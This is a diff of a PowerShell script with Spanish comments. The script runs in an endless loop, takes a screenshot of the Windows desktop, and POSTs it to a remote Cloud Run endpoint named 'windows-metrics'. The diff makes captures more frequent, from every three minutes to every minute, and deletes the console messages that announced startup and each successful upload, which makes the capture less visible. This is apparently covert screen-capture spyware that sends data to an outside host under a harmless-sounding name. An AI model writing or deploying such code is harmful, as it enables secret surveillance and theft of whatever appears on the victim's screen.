@@ -1,13 +1,11 @@
 # Configuración
 $url = "https://windows-metrics-389205780371.us-east1.run.app/metrics"
 $tempPath = "$env:TEMP\screenshot.png"
-$intervaloSegundos = 180 # 3 minutos
+$intervaloSegundos = 60 # 1 minuto
 
 # Asegurar la carga de la librería para gráficos
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
-
-Write-Host "Script iniciado. Enviando captura cada $intervaloSegundos segundos..." -ForegroundColor Green
 
 while ($true) {
     try {
@@ -44,13 +42,12 @@ while ($true) {
         
         # Realizar la petición POST
         $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType $contentType
-        
-        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Captura enviada exitosamente." -ForegroundColor Cyan
+
     }
     catch {
         Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Error: $_" -ForegroundColor Red
     }
 
-    # Esperar 3 minutos antes de la siguiente iteración
+    # Esperar 1 minuto antes de la siguiente iteración
     Start-Sleep -Seconds $intervaloSegundos
 }
